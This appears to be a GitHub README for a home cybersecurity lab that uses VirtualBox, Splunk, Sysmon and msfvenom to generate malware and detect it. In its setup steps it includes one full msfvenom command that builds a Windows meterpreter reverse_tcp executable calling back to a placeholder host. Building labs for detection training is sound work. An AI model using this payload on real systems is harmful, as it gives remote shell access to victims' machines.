# Cybersecurity-Home-Lab:-Malware-Analysis

This repository documents the setup and execution of a cybersecurity home lab designed to simulate and analyze malware activity in a controlled environment. The lab utilizes VirtualBox, Splunk, Sysmon, and msfvenom to demonstrate malware creation, detection, and analysis.

## Overview

The home lab is a self-contained environment built to:

- Simulate real-world cyberattacks.
- Analyze malicious activity using monitoring tools.
- Gain hands-on experience in threat detection and endpoint security.

## Features

- **Virtualized Environment**: Created isolated Windows and Linux virtual machines using VirtualBox.
- **Threat Simulation**: Developed custom malware using msfvenom on the Linux machine.
- **Monitoring and Analysis**: Configured Splunk and Sysmon on the Windows machine to detect and analyze system events and malicious activity.
- **Command Execution**: Simulated a successful breach and analyzed command execution on the Windows machine.

## Tools and Technologies

- **VirtualBox**: Used to set up and manage the virtual machines.
- **Windows Virtual Machine**: Hosted Splunk and Sysmon for event monitoring.
- **Linux Virtual Machine**: Used for creating malware with msfvenom.
- **Splunk**: Enabled real-time analysis of logs and system activities.
- **Sysmon**: Provided detailed logs of system events for analysis.
- **msfvenom**: Created custom malware payloads for attack simulations.

## Setup Instructions

1. **Install VirtualBox**

- Download and install [VirtualBox](https://www.virtualbox.org/)
- Create two virtual machines (Windows and Linux)

2. **Configure the Windows Machine**

- Install [Splunk](https://www.splunk.com/) and set up an instance
- Install and configure [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

3. **Set up Linux Machine**

- Install necessary dependencies for msfvenom
- Create a custom malware payload using msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f exe > malware.exe`

4. **Simulate the Attack**

- Transfer the malware payload from the Linux machine to the Windows machine
- Execute the malware on the Windows machine

5. **Monitor and Analyze**

- Use Splunk to monitor logs and detect the malicious activity
- Analyze system events recorded by Sysmon

## Learning Outcomes

- Practical experience with endpoint monitoring and detection tools.
- Understanding of malware creation and behavior.
- Hands-on knowledge of setting up and using Splunk and Sysmon for security analysis.
- Skills in managing virtualized environments for cybersecurity simulations.
